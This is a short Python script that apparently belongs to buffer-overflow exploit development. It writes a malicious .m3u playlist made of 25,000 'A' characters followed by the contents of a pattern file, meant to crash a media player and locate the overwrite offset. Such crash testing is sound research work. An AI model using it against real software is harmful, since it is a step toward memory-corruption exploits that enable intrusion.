with open("patt", 'r') as g: 
    with open("crash1.m3u", 'w') as f:
        f.write("A"*25000)
	f.write(g.read())

